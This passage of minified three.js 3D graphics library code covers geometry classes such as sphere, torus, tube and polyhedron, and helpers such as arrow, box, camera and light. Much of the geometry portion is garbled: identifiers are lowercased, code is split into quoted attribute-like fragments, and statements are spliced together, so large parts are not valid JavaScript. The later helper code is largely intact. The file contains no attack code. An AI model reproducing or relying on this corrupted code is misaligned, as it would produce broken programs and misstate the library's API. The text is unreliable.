k);this.addattribute(\"normal\",l);this.addattribute(\"uv\",g)};three.ringbuffergeometry.prototype=\"Object.create(THREE.BufferGeometry.prototype);THREE.RingBufferGeometry.prototype.constructor=THREE.RingBufferGeometry;THREE.RingGeometry=function(a,b,c,d,e,f){THREE.Geometry.call(this);this.type=\"RingGeometry\";this.parameters={innerRadius:a,outerRadius:b,thetaSegments:c,phiSegments:d,thetaStart:e,thetaLength:f};this.fromBufferGeometry(new\" three.ringbuffergeometry(a,b,c,d,e,f))};=\"\" three.ringgeometry.prototype=\"Object.create(THREE.Geometry.prototype);THREE.RingGeometry.prototype.constructor=THREE.RingGeometry;THREE.SphereGeometry=function(a,b,c,d,e,f,g){THREE.Geometry.call(this);this.type=\"SphereGeometry\";this.parameters={radius:a,widthSegments:b,heightSegments:c,phiStart:d,phiLength:e,thetaStart:f,thetaLength:g};this.fromBufferGeometry(new\" three.spherebuffergeometry(a,b,c,d,e,f,g))};three.spheregeometry.prototype=\"Object.create(THREE.Geometry.prototype);\" three.spheregeometry.prototype.constructor=\"THREE.SphereGeometry;\" three.spherebuffergeometry=\"function(a,b,c,d,e,f,g){THREE.BufferGeometry.call(this);this.type=\"SphereBufferGeometry\";this.parameters={radius:a,widthSegments:b,heightSegments:c,phiStart:d,phiLength:e,thetaStart:f,thetaLength:g};a=a||50;b=Math.max(3,Math.floor(b)||8);c=Math.max(2,Math.floor(c)||6);d=void\" h=\"f+g,k=(b+1)*(c+1),l=new\" float32array(3*k),3),n=\"new\" k),3),k=\"new\" float32array(2*k),2),p=\"0,m=[],q=new\" three.vector3,r=\"0;r<=c;r++){for(var\" s=\"[],t=r/c,u=0;u<=b;u++){var\" v=\"u/b,C=-a*Math.cos(d+v*e)*Math.sin(f+t*g),w=a*Math.cos(f+t*g),E=a*Math.sin(d+v*e)*Math.sin(f+t*g);q.set(C,w,E).normalize();l.setXYZ(p,C,w,E);n.setXYZ(p,q.x,q.y,q.z);k.setXY(p,v,1-t);s.push(p);p++}m.push(s)}d=[];for(r=0;r<c;r++)for(u=0;u<b;u++)e=m[r][u+1],g=m[r][u],p=m[r+1][u],q=m[r+1][u+1],(0!==r||0<f)&&d.push(e,g,q),(r!==c-1||h<Math.PI)&&d.push(g,p,q);this.setIndex(new\" (65535<=\"\" l.count?three.uint32attribute:three.uint16attribute)(d,1));this.addattribute(\"position\",l);this.addattribute(\"normal\",n);this.addattribute(\"uv\",k);this.boundingsphere=\"new\" three.sphere(new=\"\" three.vector3,a)};three.spherebuffergeometry.prototype=\"Object.create(THREE.BufferGeometry.prototype);THREE.SphereBufferGeometry.prototype.constructor=THREE.SphereBufferGeometry;\" three.textgeometry=\"function(a,b){b=b||{};var\" instanceof=\"\" three.font)return=\"\" console.error(\"three.textgeometry:=\"\" font=\"\" parameter=\"\" is=\"\" not=\"\" an=\"\" instance=\"\" of=\"\" three.font.\"),new=\"\" three.geometry;c=\"c.generateShapes(a,b.size,b.curveSegments);b.amount=void\" three.textgeometry.prototype=\"Object.create(THREE.ExtrudeGeometry.prototype);THREE.TextGeometry.prototype.constructor=THREE.TextGeometry;\" three.torusbuffergeometry=\"function(a,b,c,d,e){THREE.BufferGeometry.call(this);this.type=\"TorusBufferGeometry\";this.parameters={radius:a,tube:b,radialSegments:c,tubularSegments:d,arc:e};a=a||100;b=b||40;c=Math.floor(c)||8;d=Math.floor(d)||6;e=e||2*Math.PI;var\" (65535<g?uint32array:uint16array)(g),h=\"new\" float32array(3*f),k=\"new\" float32array(3*f),f=\"new\" float32array(2*f),l=\"0,n=0,p=0,m=new\" three.vector3,s,t;for(s=\"0;s<=c;s++)for(t=0;t<=d;t++){var\" u=\"t/d*e,v=s/c*Math.PI*2;q.x=(a+b*Math.cos(v))*Math.cos(u);q.y=(a+b*Math.cos(v))*Math.sin(u);q.z=b*Math.sin(v);h[l]=q.x;h[l+1]=q.y;h[l+2]=q.z;m.x=a*Math.cos(u);m.y=a*Math.sin(u);r.subVectors(q,m).normalize();k[l]=r.x;k[l+1]=r.y;k[l+2]=r.z;f[n]=t/d;f[n+1]=s/c;l+=3;n+=2}for(s=1;s<=c;s++)for(t=1;t<=d;t++)a=(d+1)*(s-1)+t-1,b=(d+1)*(s-1)+t,e=(d+1)*s+t,g[p]=(d+1)*s+t-1,g[p+1]=a,g[p+2]=e,g[p+3]=a,g[p+4]=b,g[p+5]=e,p+=6;this.setIndex(new\" three.bufferattribute(g,1));this.addattribute(\"position\",new=\"\" three.bufferattribute(h,=\"\" 3));this.addattribute(\"normal\",new=\"\" three.bufferattribute(k,3));this.addattribute(\"uv\",new=\"\" three.bufferattribute(f,2))};three.torusbuffergeometry.prototype=\"Object.create(THREE.BufferGeometry.prototype);THREE.TorusBufferGeometry.prototype.constructor=THREE.TorusBufferGeometry;\" three.torusgeometry=\"function(a,b,c,d,e){THREE.Geometry.call(this);this.type=\"TorusGeometry\";this.parameters={radius:a,tube:b,radialSegments:c,tubularSegments:d,arc:e};this.fromBufferGeometry(new\" three.torusbuffergeometry(a,b,c,d,e))};three.torusgeometry.prototype=\"Object.create(THREE.Geometry.prototype);THREE.TorusGeometry.prototype.constructor=THREE.TorusGeometry;\" three.torusknotbuffergeometry=\"function(a,b,c,d,e,f){function\" g(a,b,c,d,e){var=\"\" (65535<k?uint32array:uint16array)(k),1),l=\"new\" h),3),n=\"new\" float32array(3*h),3),h=\"new\" float32array(2*h),2),p,m,q=\"0,r=0,s=new\" three.vector3,u=\"new\" three.vector2,v=\"new\" three.vector3,w=\"new\" three.vector3,e=\"new\" three.vector3,z=\"new\" three.vector3;for(p=\"0;p<=c;++p)for(m=p/c*e*Math.PI*2,g(m,e,f,a,v),g(m+.01,e,f,a,C),E.subVectors(C,v),z.addVectors(C,v),w.crossVectors(E,z),z.crossVectors(w,E),w.normalize(),z.normalize(),m=0;m<=d;++m){var\" y=\"m/d*Math.PI*2,A=-b*Math.cos(y),\" three.torusknotbuffergeometry.prototype=\"Object.create(THREE.BufferGeometry.prototype);THREE.TorusKnotBufferGeometry.prototype.constructor=THREE.TorusKnotBufferGeometry;\" three.torusknotgeometry=\"function(a,b,c,d,e,f,g){THREE.Geometry.call(this);this.type=\"TorusKnotGeometry\";this.parameters={radius:a,tube:b,tubularSegments:c,radialSegments:d,p:e,q:f};void\" heightscale=\"\" has=\"\" been=\"\" deprecated.=\"\" use=\"\" .scale(=\"\" x,=\"\" y,=\"\" z=\"\" )=\"\" instead.\");this.frombuffergeometry(new=\"\" three.torusknotbuffergeometry(a,b,c,d,e,f));this.mergevertices()};three.torusknotgeometry.prototype=\"Object.create(THREE.Geometry.prototype);\" three.torusknotgeometry.prototype.constructor=\"THREE.TorusKnotGeometry;\" three.tubegeometry=\"function(a,b,c,d,e,f){THREE.Geometry.call(this);this.type=\"TubeGeometry\";this.parameters={path:a,segments:b,radius:c,radialSegments:d,closed:e,taper:f};b=b||64;c=c||1;d=d||8;e=e||!1;f=f||THREE.TubeGeometry.NoTaper;var\" three.vector3,t,u,v;t=\"new\" three.tubegeometry.frenetframes(a,b,e);u=\"t.normals;v=t.binormals;this.tangents=t.tangents;this.normals=u;this.binormals=v;for(t=0;t<l;t++)for(g[t]=[],n=t/(l-1),r=a.getPointAt(n),h=u[t],k=v[t],m=c*f(n),n=0;n<\" d;n++)p=\"n/d*2*Math.PI,q=-m*Math.cos(p),p=m*Math.sin(p),s.copy(r),s.x+=q*h.x+p*k.x,s.y+=q*h.y+p*k.y,s.z+=q*h.z+p*k.z,g[t][n]=this.vertices.push(new\" three.vector3(s.x,s.y,s.z))-1;for(t=\"0;t<b;t++)for(n=0;n<d;n++)f=e?(t+1)%b:t+1,l=(n+1)%d,a=g[t][n],c=g[f][n],f=g[f][l],l=g[t][l],s=new\" three.vector2(t=\"\" b,n=\"\" d),u=\"new\" three.vector2((t+1)=\"\" d),v=\"new\" b,(n+1)=\"\" d),h=\"new\" d),this.faces.push(new=\"\" three.face3(a,c,l)),this.facevertexuvs[0].push([s,u,h]),this.faces.push(new=\"\" three.face3(c,=\"\" f,l)),this.facevertexuvs[0].push([u.clone(),v,h.clone()]);this.computefacenormals();this.computevertexnormals()};three.tubegeometry.prototype=\"Object.create(THREE.Geometry.prototype);THREE.TubeGeometry.prototype.constructor=THREE.TubeGeometry;THREE.TubeGeometry.NoTaper=function(a){return\" 1};three.tubegeometry.sinusoidaltaper=\"function(a){return\" math.sin(math.pi*a)};=\"\" three.tubegeometry.frenetframes=\"function(a,b,c){var\" d=\"new\" three.matrix4;b+=\"1;var\" l,n,p;this.tangents=\"e;this.normals=f;this.binormals=g;for(l=0;l<b;l++)n=l/(b-1),e[l]=a.getTangentAt(n),e[l].normalize();f[0]=new\" three.vector3;g[0]=\"new\" three.vector3;a=\"Number.MAX_VALUE;l=Math.abs(e[0].x);n=Math.abs(e[0].y);p=Math.abs(e[0].z);l<=a&&(a=l,d.set(1,0,0));n<=a&&(a=n,d.set(0,1,0));p<=a&&d.set(0,0,1);h.crossVectors(e[0],d).normalize();f[0].crossVectors(e[0],\" h);g[0].crossvectors(e[0],f[0]);for(l=\"1;l<b;l++)f[l]=f[l-1].clone(),g[l]=g[l-1].clone(),h.crossVectors(e[l-1],e[l]),h.length()\">Number.EPSILON&&(h.normalize(),d=Math.acos(THREE.Math.clamp(e[l-1].dot(e[l]),-1,1)),f[l].applyMatrix4(k.makeRotationAxis(h,d))),g[l].crossVectors(e[l],f[l]);if(c)for(d=Math.acos(THREE.Math.clamp(f[0].dot(f[b-1]),-1,1)),d/=b-1,0<e[0].dot(h.crossvectors(f[0],f[b-1]))&&(d=-d),l=1;l<b;l++)f[l].applymatrix4(k.makerotationaxis(e[l],d*l)),g[l].crossvectors(e[l],f[l])}; three.polyhedrongeometry=\"function(a,b,c,d){function\" e(a){var=\"\" b=\"a.normalize().clone();b.index=k.vertices.push(b)-1;var\" c=\"Math.atan2(a.z,-a.x)/2/Math.PI+.5;a=Math.atan2(-a.y,Math.sqrt(a.x*a.x+a.z*a.z))/Math.PI+.5;b.uv=new\" three.vector2(c,1-a);return=\"\" b}function=\"\" f(a,b,c){var=\"\" d=\"new\" three.face3(a.index,b.index,c.index,[a.clone(),b.clone(),c.clone()]);k.faces.push(d);t.copy(a).add(b).add(c).dividescalar(3);d=\"Math.atan2(t.z,-t.x);k.faceVertexUvs[0].push([h(a.uv,a,d),h(b.uv,b,d),h(c.uv,c,d)])}function\" g(a,=\"\" b){for(var=\"\" n=\"e(d.clone().lerp(h,m/c)),p=e(g.clone().lerp(h,m/c)),q=c-m,r=0;r<=q;r++)l[m][r]=0===r&&m===c?n:e(n.clone().lerp(p,r/q))}for(m=0;m<c;m++)for(r=0;r<2*(c-m)-1;r++)d=Math.floor(r/2),0===r%2?f(l[m][d+1],l[m+1][d],l[m][d]):f(l[m][d+1],l[m+1][d+1],l[m+1][d])}function\" h(a,b,c){0=\"\">c&&1===a.x&&(a=new THREE.Vector2(a.x-1,a.y));0===b.x&&0===b.z&&(a=new THREE.Vector2(c/2/Math.PI+.5,a.y));\nreturn a.clone()}THREE.Geometry.call(this);this.type=\"PolyhedronGeometry\";this.parameters={vertices:a,indices:b,radius:c,detail:d};c=c||1;d=d||0;for(var k=this,l=0,n=a.length;l<n;l+=3)e(new three.vector3(a[l],a[l+1],a[l+2]));a=\"this.vertices;for(var\" p=\"[],m=l=0,n=b.length;l<n;l+=3,m++){var\" q=\"a[b[l]],r=a[b[l+1]],s=a[b[l+2]];p[m]=new\" three.face3(q.index,r.index,s.index,[q.clone(),r.clone(),s.clone()])}for(var=\"\" t=\"new\" three.vector3,l=\"0,n=p.length;l<n;l++)g(p[l],d);l=0;for(n=this.faceVertexUvs[0].length;l<\" n;l++)b=\"this.faceVertexUvs[0][l],d=b[0].x,a=b[1].x,p=b[2].x,m=Math.max(d,a,p),q=Math.min(d,a,p),.9<m&&.1\">q&&(.2>d&&(b[0].x+=1),.2>a&&(b[1].x+=1),.2>p&&(b[2].x+=1));l=0;for(n=this.vertices.length;l<n;l++)this.vertices[l].multiplyscalar(c);this.mergevertices();this.computefacenormals();this.boundingsphere=new three.sphere(new=\"\" three.vector3,c)};three.polyhedrongeometry.prototype=\"Object.create(THREE.Geometry.prototype);THREE.PolyhedronGeometry.prototype.constructor=THREE.PolyhedronGeometry;\" three.dodecahedrongeometry=\"function(a,b){var\" c=\"(1+Math.sqrt(5))/2,d=1/c;THREE.PolyhedronGeometry.call(this,[-1,-1,-1,-1,-1,1,-1,1,-1,-1,1,1,1,-1,-1,1,-1,1,1,1,-1,1,1,1,0,-d,-c,0,-d,c,0,d,-c,0,d,c,-d,-c,0,-d,c,0,d,-c,0,d,c,0,-c,0,-d,c,0,-d,-c,0,d,c,0,d],[3,11,7,3,7,15,3,15,13,7,19,17,7,17,6,7,6,15,17,4,8,17,8,10,17,10,6,8,0,16,8,16,2,8,2,10,0,12,1,0,1,18,0,18,16,6,10,2,6,2,13,6,13,15,2,16,18,2,18,3,2,3,13,18,1,9,18,9,11,18,11,3,4,14,12,4,12,0,4,0,8,11,9,5,11,5,19,11,19,7,19,5,14,19,14,4,19,4,17,1,\" 12,14,1,14,5,1,5,9],a,b);this.type=\"DodecahedronGeometry\" ;this.parameters=\"{radius:a,detail:b}};THREE.DodecahedronGeometry.prototype=Object.create(THREE.PolyhedronGeometry.prototype);THREE.DodecahedronGeometry.prototype.constructor=THREE.DodecahedronGeometry;\" three.icosahedrongeometry=\"function(a,b){var\" three.icosahedrongeometry.prototype.constructor=\"THREE.IcosahedronGeometry;THREE.OctahedronGeometry=function(a,b){THREE.PolyhedronGeometry.call(this,[1,0,0,-1,0,0,0,1,0,0,-1,0,0,0,1,0,0,-1],[0,2,4,0,4,3,0,3,5,0,5,2,1,2,5,1,5,3,1,3,4,1,4,2],a,b);this.type=\"OctahedronGeometry\";this.parameters={radius:a,detail:b}};THREE.OctahedronGeometry.prototype=Object.create(THREE.PolyhedronGeometry.prototype);THREE.OctahedronGeometry.prototype.constructor=THREE.OctahedronGeometry;\" three.tetrahedrongeometry=\"function(a,b){THREE.PolyhedronGeometry.call(this,[1,1,1,-1,-1,1,-1,1,-1,1,-1,-1],[2,1,0,0,3,2,1,3,0,2,3,1],a,b);this.type=\"TetrahedronGeometry\";this.parameters={radius:a,detail:b}};THREE.TetrahedronGeometry.prototype=Object.create(THREE.PolyhedronGeometry.prototype);THREE.TetrahedronGeometry.prototype.constructor=THREE.TetrahedronGeometry;\" three.parametricgeometry=\"function(a,b,c){THREE.Geometry.call(this);this.type=\"ParametricGeometry\";this.parameters={func:a,slices:b,stacks:c};var\" d=\"this.vertices,e=this.faces,f=this.faceVertexUvs[0],g,h,k,l,n=b+1;for(g=0;g<=c;g++)for(l=g/c,h=0;h<=b;h++)k=h/b,k=a(k,l),d.push(k);var\" p,m,q,r;for(g=\"0;g<c;g++)for(h=0;h<b;h++)a=g*n+h,d=g*n+h+1,l=(g+1)*n+h+1,k=(g+1)*n+h,p=new\" three.vector2(h=\"\" b,g=\"\" c),m=\"new\" three.vector2((h+1)=\"\" c),q=\"new\" b,(g+1)=\"\" c),r=\"new\" c),e.push(new=\"\" three.face3(a,=\"\" d,k)),f.push([p,m,r]),e.push(new=\"\" three.face3(d,l,k)),f.push([m.clone(),q,r.clone()]);this.computefacenormals();this.computevertexnormals()};three.parametricgeometry.prototype=\"Object.create(THREE.Geometry.prototype);THREE.ParametricGeometry.prototype.constructor=THREE.ParametricGeometry;\" three.wireframegeometry=\"function(a){function\" b(a,b){return=\"\" a-b}three.buffergeometry.call(this);var=\"\" instanceof=\"\" three.geometry){var=\"\" f=\"a.vertices,g=a.faces,h=0,k=new\" uint32array(6*g.length);a=\"0;for(var\" l=\"g.length;a<l;a++)for(var\" n=\"g[a],p=0;3\">p;p++){c[0]=n[e[p]];c[1]=n[e[(p+1)%3]];c.sort(b);var m=c.toString();void 0===d[m]&&(k[2*h]=c[0],k[2*h+1]=c[1],d[m]=!0,h++)}c=new Float32Array(6*h);a=0;for(l=h;a<l;a++)for(p=0;2>p;p++)d=f[k[2*a+p]],h=6*a+3*p,c[h+0]=d.x,c[h+1]=d.y,\nc[h+2]=d.z;this.addAttribute(\"position\",new THREE.BufferAttribute(c,3))}else if(a instanceof THREE.BufferGeometry){if(null!==a.index){l=a.index.array;f=a.attributes.position;e=a.groups;h=0;0===e.length&&a.addGroup(0,l.length);k=new Uint32Array(2*l.length);g=0;for(n=e.length;g<n;++g){a=e[g];p=a.start;m=a.count;a=p;for(var q=\"p+m;a<q;a+=3)for(p=0;3\">p;p++)c[0]=l[a+p],c[1]=l[a+(p+1)%3],c.sort(b),m=c.toString(),void 0===d[m]&&(k[2*h]=c[0],k[2*h+1]=c[1],d[m]=!0,h++)}c=new Float32Array(6*h);a=0;for(l=h;a<\nl;a++)for(p=0;2>p;p++)h=6*a+3*p,d=k[2*a+p],c[h+0]=f.getX(d),c[h+1]=f.getY(d),c[h+2]=f.getZ(d)}else for(f=a.attributes.position.array,h=f.length/3,k=h/3,c=new Float32Array(6*h),a=0,l=k;a<l;a++)for(p=0;3>p;p++)h=18*a+6*p,k=9*a+3*p,c[h+0]=f[k],c[h+1]=f[k+1],c[h+2]=f[k+2],d=9*a+(p+1)%3*3,c[h+3]=f[d],c[h+4]=f[d+1],c[h+5]=f[d+2];this.addAttribute(\"position\",new THREE.BufferAttribute(c,3))}};THREE.WireframeGeometry.prototype=Object.create(THREE.BufferGeometry.prototype);\nTHREE.WireframeGeometry.prototype.constructor=THREE.WireframeGeometry;THREE.AxisHelper=function(a){a=a||1;var b=new Float32Array([0,0,0,a,0,0,0,0,0,0,a,0,0,0,0,0,0,a]),c=new Float32Array([1,0,0,1,.6,0,0,1,0,.6,1,0,0,0,1,0,.6,1]);a=new THREE.BufferGeometry;a.addAttribute(\"position\",new THREE.BufferAttribute(b,3));a.addAttribute(\"color\",new THREE.BufferAttribute(c,3));b=new THREE.LineBasicMaterial({vertexColors:THREE.VertexColors});THREE.LineSegments.call(this,a,b)};THREE.AxisHelper.prototype=Object.create(THREE.LineSegments.prototype);\nTHREE.AxisHelper.prototype.constructor=THREE.AxisHelper;\nTHREE.ArrowHelper=function(){var a=new THREE.BufferGeometry;a.addAttribute(\"position\",new THREE.Float32Attribute([0,0,0,0,1,0],3));var b=new THREE.CylinderBufferGeometry(0,.5,1,5,1);b.translate(0,-.5,0);return function(c,d,e,f,g,h){THREE.Object3D.call(this);void 0===f&&(f=16776960);void 0===e&&(e=1);void 0===g&&(g=.2*e);void 0===h&&(h=.2*g);this.position.copy(d);this.line=new THREE.Line(a,new THREE.LineBasicMaterial({color:f}));this.line.matrixAutoUpdate=!1;this.add(this.line);this.cone=new THREE.Mesh(b,\nnew THREE.MeshBasicMaterial({color:f}));this.cone.matrixAutoUpdate=!1;this.add(this.cone);this.setDirection(c);this.setLength(e,g,h)}}();THREE.ArrowHelper.prototype=Object.create(THREE.Object3D.prototype);THREE.ArrowHelper.prototype.constructor=THREE.ArrowHelper;\nTHREE.ArrowHelper.prototype.setDirection=function(){var a=new THREE.Vector3,b;return function(c){.99999<c.y?this.quaternion.set(0,0,0,1):-.99999>c.y?this.quaternion.set(1,0,0,0):(a.set(c.z,0,-c.x).normalize(),b=Math.acos(c.y),this.quaternion.setFromAxisAngle(a,b))}}();THREE.ArrowHelper.prototype.setLength=function(a,b,c){void 0===b&&(b=.2*a);void 0===c&&(c=.2*b);this.line.scale.set(1,Math.max(0,a-b),1);this.line.updateMatrix();this.cone.scale.set(c,b,c);this.cone.position.y=a;this.cone.updateMatrix()};\nTHREE.ArrowHelper.prototype.setColor=function(a){this.line.material.color.copy(a);this.cone.material.color.copy(a)};THREE.BoxHelper=function(a,b){void 0===b&&(b=16776960);var c=new Uint16Array([0,1,1,2,2,3,3,0,4,5,5,6,6,7,7,4,0,4,1,5,2,6,3,7]),d=new Float32Array(24),e=new THREE.BufferGeometry;e.setIndex(new THREE.BufferAttribute(c,1));e.addAttribute(\"position\",new THREE.BufferAttribute(d,3));THREE.LineSegments.call(this,e,new THREE.LineBasicMaterial({color:b}));void 0!==a&&this.update(a)};\nTHREE.BoxHelper.prototype=Object.create(THREE.LineSegments.prototype);THREE.BoxHelper.prototype.constructor=THREE.BoxHelper;\nTHREE.BoxHelper.prototype.update=function(){var a=new THREE.Box3;return function(b){b instanceof THREE.Box3?a.copy(b):a.setFromObject(b);if(!a.isEmpty()){b=a.min;var c=a.max,d=this.geometry.attributes.position,e=d.array;e[0]=c.x;e[1]=c.y;e[2]=c.z;e[3]=b.x;e[4]=c.y;e[5]=c.z;e[6]=b.x;e[7]=b.y;e[8]=c.z;e[9]=c.x;e[10]=b.y;e[11]=c.z;e[12]=c.x;e[13]=c.y;e[14]=b.z;e[15]=b.x;e[16]=c.y;e[17]=b.z;e[18]=b.x;e[19]=b.y;e[20]=b.z;e[21]=c.x;e[22]=b.y;e[23]=b.z;d.needsUpdate=!0;this.geometry.computeBoundingSphere()}}}();\nTHREE.BoundingBoxHelper=function(a,b){var c=void 0!==b?b:8947848;this.object=a;this.box=new THREE.Box3;THREE.Mesh.call(this,new THREE.BoxGeometry(1,1,1),new THREE.MeshBasicMaterial({color:c,wireframe:!0}))};THREE.BoundingBoxHelper.prototype=Object.create(THREE.Mesh.prototype);THREE.BoundingBoxHelper.prototype.constructor=THREE.BoundingBoxHelper;THREE.BoundingBoxHelper.prototype.update=function(){this.box.setFromObject(this.object);this.box.size(this.scale);this.box.center(this.position)};\nTHREE.CameraHelper=function(a){function b(a,b,d){c(a,d);c(b,d)}function c(a,b){d.vertices.push(new THREE.Vector3);d.colors.push(new THREE.Color(b));void 0===f[a]&&(f[a]=[]);f[a].push(d.vertices.length-1)}var d=new THREE.Geometry,e=new THREE.LineBasicMaterial({color:16777215,vertexColors:THREE.FaceColors}),f={};b(\"n1\",\"n2\",16755200);b(\"n2\",\"n4\",16755200);b(\"n4\",\"n3\",16755200);b(\"n3\",\"n1\",16755200);b(\"f1\",\"f2\",16755200);b(\"f2\",\"f4\",16755200);b(\"f4\",\"f3\",16755200);b(\"f3\",\"f1\",16755200);b(\"n1\",\"f1\",16755200);\nb(\"n2\",\"f2\",16755200);b(\"n3\",\"f3\",16755200);b(\"n4\",\"f4\",16755200);b(\"p\",\"n1\",16711680);b(\"p\",\"n2\",16711680);b(\"p\",\"n3\",16711680);b(\"p\",\"n4\",16711680);b(\"u1\",\"u2\",43775);b(\"u2\",\"u3\",43775);b(\"u3\",\"u1\",43775);b(\"c\",\"t\",16777215);b(\"p\",\"c\",3355443);b(\"cn1\",\"cn2\",3355443);b(\"cn3\",\"cn4\",3355443);b(\"cf1\",\"cf2\",3355443);b(\"cf3\",\"cf4\",3355443);THREE.LineSegments.call(this,d,e);this.camera=a;this.camera.updateProjectionMatrix&&this.camera.updateProjectionMatrix();this.matrix=a.matrixWorld;this.matrixAutoUpdate=\n!1;this.pointMap=f;this.update()};THREE.CameraHelper.prototype=Object.create(THREE.LineSegments.prototype);THREE.CameraHelper.prototype.constructor=THREE.CameraHelper;\nTHREE.CameraHelper.prototype.update=function(){function a(a,g,h,k){d.set(g,h,k).unproject(e);a=c[a];if(void 0!==a)for(g=0,h=a.length;g<h;g++)b.vertices[a[g]].copy(d)}var 0=\"==b&&(b=1);var\" b,c,d=\"new\" three.vector3,e=\"new\" three.camera;return=\"\" function(){b=\"this.geometry;c=this.pointMap;e.projectionMatrix.copy(this.camera.projectionMatrix);a(\"c\",0,0,-1);a(\"t\",0,0,1);a(\"n1\",-1,-1,-1);a(\"n2\",1,-1,-1);a(\"n3\",-1,1,-1);a(\"n4\",1,1,-1);a(\"f1\",-1,-1,1);a(\"f2\",1,-1,1);a(\"f3\",-1,1,1);a(\"f4\",1,1,1);a(\"u1\",.7,1.1,-1);a(\"u2\",-.7,1.1,\" -1);a(\"u3\",0,2,-1);a(\"cf1\",-1,0,1);a(\"cf2\",1,0,1);a(\"cf3\",0,-1,1);a(\"cf4\",0,1,1);a(\"cn1\",-1,0,-1);a(\"cn2\",1,0,-1);a(\"cn3\",0,-1,-1);a(\"cn4\",0,1,-1);b.verticesneedupdate=\"!0}}();\" three.directionallighthelper=\"function(a,b){THREE.Object3D.call(this);this.light=a;this.light.updateMatrixWorld();this.matrix=a.matrixWorld;this.matrixAutoUpdate=!1;void\" c=\"new\" three.buffergeometry;c.addattribute(\"position\",new=\"\" three.float32attribute([-b,b,0,b,b,0,b,-b,0,-b,-b,0,-b,b,0],3));var=\"\" d=\"new\" three.linebasicmaterial({fog:!1});this.add(new=\"\" three.line(c,d));c=\"new\" three.float32attribute([0,0,0,0,0,1],3));this.add(new=\"\" three.line(c,=\"\" d));this.update()};three.directionallighthelper.prototype=\"Object.create(THREE.Object3D.prototype);THREE.DirectionalLightHelper.prototype.constructor=THREE.DirectionalLightHelper;THREE.DirectionalLightHelper.prototype.dispose=function(){var\" a=\"this.children[0],b=this.children[1];a.geometry.dispose();a.material.dispose();b.geometry.dispose();b.material.dispose()};\" three.directionallighthelper.prototype.update=\"function(){var\" three.vector3,b=\"new\" three.vector3,c=\"new\" three.vector3;return=\"\" function(){a.setfrommatrixposition(this.light.matrixworld);b.setfrommatrixposition(this.light.target.matrixworld);c.subvectors(b,a);var=\"\" three.edgeshelper=\"function(a,b,c){b=void\" 0!=\"=b?b:16777215;THREE.LineSegments.call(this,new\" three.edgesgeometry(a.geometry,c),new=\"\" three.linebasicmaterial({color:b}));this.matrix=\"a.matrixWorld;this.matrixAutoUpdate=!1};THREE.EdgesHelper.prototype=Object.create(THREE.LineSegments.prototype);THREE.EdgesHelper.prototype.constructor=THREE.EdgesHelper;\" three.facenormalshelper=\"function(a,b,c,d){this.object=a;this.size=void\" instanceof=\"\" three.geometry?b=\"c.faces.length:console.warn(\"THREE.FaceNormalsHelper:\" only=\"\" three.geometry=\"\" is=\"\" supported.=\"\" use=\"\" three.vertexnormalshelper,=\"\" instead.\");c=\"new\" three.buffergeometry;b=\"new\" three.float32attribute(6*b,3);c.addattribute(\"position\",b);three.linesegments.call(this,c,new=\"\" three.linebasicmaterial({color:a,linewidth:d}));this.matrixautoupdate=\"!1;this.update()};THREE.FaceNormalsHelper.prototype=Object.create(THREE.LineSegments.prototype);THREE.FaceNormalsHelper.prototype.constructor=THREE.FaceNormalsHelper;\" three.facenormalshelper.prototype.update=\"function(){var\" three.matrix3;return=\"\" function(){this.object.updatematrixworld(!0);c.getnormalmatrix(this.object.matrixworld);for(var=\"\" n=\"f[k],p=n.normal;a.copy(g[n.a]).add(g[n.b]).add(g[n.c]).divideScalar(3).applyMatrix4(d);b.copy(p).applyMatrix3(c).normalize().multiplyScalar(this.size).add(a);\" e.setxyz(h,a.x,a.y,a.z);h+=\"1;e.setXYZ(h,b.x,b.y,b.z);h+=1}e.needsUpdate=!0;return\" this}}();=\"\" three.gridhelper=\"function(a,b,c,d){c=new\" three.color(void=\"\" e=\"[],f=[],g=-a,h=0;g<=a;g+=b){e.push(-a,0,g,a,0,g);e.push(g,0,-a,g,0,a);var\" k=\"0===g?c:d;k.toArray(f,h);h+=3;k.toArray(f,h);h+=3;k.toArray(f,h);h+=3;k.toArray(f,h);h+=3}a=new\" three.buffergeometry;a.addattribute(\"position\",new=\"\" three.float32attribute(e,3));a.addattribute(\"color\",new=\"\" three.float32attribute(f,3));e=\"new\" three.linebasicmaterial({vertexcolors:three.vertexcolors});three.linesegments.call(this,=\"\" a,e)};three.gridhelper.prototype=\"Object.create(THREE.LineSegments.prototype);THREE.GridHelper.prototype.constructor=THREE.GridHelper;THREE.GridHelper.prototype.setColors=function(){console.error(\"THREE.GridHelper:\" setcolors()=\"\" has=\"\" been=\"\" deprecated,=\"\" pass=\"\" them=\"\" in=\"\" the=\"\" constructor=\"\" instead.\")};=\"\" three.hemispherelighthelper=\"function(a,b){THREE.Object3D.call(this);this.light=a;this.light.updateMatrixWorld();this.matrix=a.matrixWorld;this.matrixAutoUpdate=!1;this.colors=[new\" three.color,new=\"\" three.color];var=\"\" three.spheregeometry(b,4,2);c.rotatex(-math.pi=\"\" 2);for(var=\"\">d;d++)c.faces[d].color=this.colors[4>d?0:1];d=new THREE.MeshBasicMaterial({vertexColors:THREE.FaceColors,wireframe:!0});this.lightSphere=new THREE.Mesh(c,d);this.add(this.lightSphere);this.update()};\nTHREE.HemisphereLightHelper.prototype=Object.create(THREE.Object3D.prototype);THREE.HemisphereLightHelper.prototype.constructor=THREE.HemisphereLightHelper;THREE.HemisphereLightHelper.prototype.dispose=function(){this.lightSphere.geometry.dispose();this.lightSphere.material.dispose()};\nTHREE.HemisphereLightHelper.prototype.update=function(){var a=new THREE.Vector3;return function(){this.colors[0].copy(this.light.color).multiplyScalar(this.light.intensity);this.colors[1].copy(this.light.groundColor).multiplyScalar(this.light.intensity);this.lightSphere.lookAt(a.setFromMatrixPosition(this.light.matrixWorld).negate());this.lightSphere.geometry.colorsNeedUpdate=!0}}();\nTHREE.PointLightHelper=function(a,b){this.light=a;this.light.updateMatrixWorld();var c=new THREE.SphereBufferGeometry(b,4,2),d=new THREE.MeshBasicMaterial({wireframe:!0,fog:!1});d.color.copy(this.light.color).multiplyScalar(this.light.intensity);THREE.Mesh.call(this,c,d);this.matrix=this.light.matrixWorld;this.matrixAutoUpdate=!1};THREE.PointLightHelper.prototype=Object.create(THREE.Mesh.prototype);THREE.PointLightHelper.prototype.constructor=THREE.PointLightHelper;\nTHREE.PointLightHelper.prototype.dispose=function(){this.geometry.dispose();this.material.dispose()};THREE.PointLightHelper.prototype.update=function(){this.material.color.copy(this.light.color).multiplyScalar(this.light.intensity)};\nTHREE.SkeletonHelper=function(a){this.bones=this.getBoneList(a);for(var b=new THREE.Geometry,c=0;c<this.bones.length;c++)this.bones[c].parent 